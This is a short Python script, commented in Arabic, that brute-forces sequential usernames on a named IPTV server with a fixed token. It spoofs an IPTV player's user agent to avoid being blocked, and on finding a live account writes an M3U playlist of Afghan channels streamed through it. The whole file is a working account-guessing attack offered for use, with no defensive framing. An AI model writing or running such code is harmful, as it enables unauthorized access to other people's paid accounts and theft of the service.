import requests

# إعدادات السيرفر والمعلومات الثابتة
SERVER = "http://vipwettbornwet.top:8080"
TOKEN_SECRET = "1260f37e4c58"
CHANNELS = ["37642", "37643", "37644"] # القنوات الأفغانية

# إعداد الهيدر لتبدو كأنك مشغل IPTV حقيقي (تجنب الحظر)
HEADERS = {
    'User-Agent': 'IPTVSmartersPlayer',
    'Accept': '*/*'
}

def check_account(user):
    # نختبر القناة الأولى فقط للتأكد من أن الحساب شغال
    url = f"{SERVER}/{user}/{TOKEN_SECRET}/{CHANNELS[0]}"
    try:
        # نستخدم HEAD ليكون الطلب خفيفاً وسريعاً
        response = requests.head(url, headers=HEADERS, timeout=3, allow_redirects=True)
        if response.status_code == 200:
            return True
    except:
        pass
    return False

def update_m3u_file(working_user):
    with open("playlist.m3u", "w", encoding="utf-8") as f:
        f.write("#EXTM3U\n")
        # توليد الروابط لجميع القنوات باستخدام اليوزر الشغال
        for ch in CHANNELS:
            f.write(f'#EXTINF:-1 tvg-id="AFG_{ch}" tvg-name="AFG CHANNEL {ch}", AFG CHANNEL {ch}\n')
            f.write(f"{SERVER}/{working_user}/{TOKEN_SECRET}/{ch}.ts\n")
    print(f"✅ تم بنجاح! اليوزر الشغال هو: {working_user}")

def start_fuzzing():
    print("🚀 جاري بدء عملية الفحص وتخمين الحسابات...")
    # النطاق الذي حددته أنت (300 إلى 500)
    for i in range(300, 501):
        target_user = f"VIP016471744476160{i}"
        print(f"🔎 فحص الحساب: {target_user}", end="\r")
        
        if check_account(target_user):
            print(f"\n✨ وجدته! حساب فعال: {target_user}")
            update_m3u_file(target_user)
            return # نتوقف عند أول حساب شغال لتوفير الوقت والجهد
            
    print("\n❌ للأسف لم يتم العثور على حساب شغال في هذا النطاق.")

if __name__ == "__main__":
    start_fuzzing()
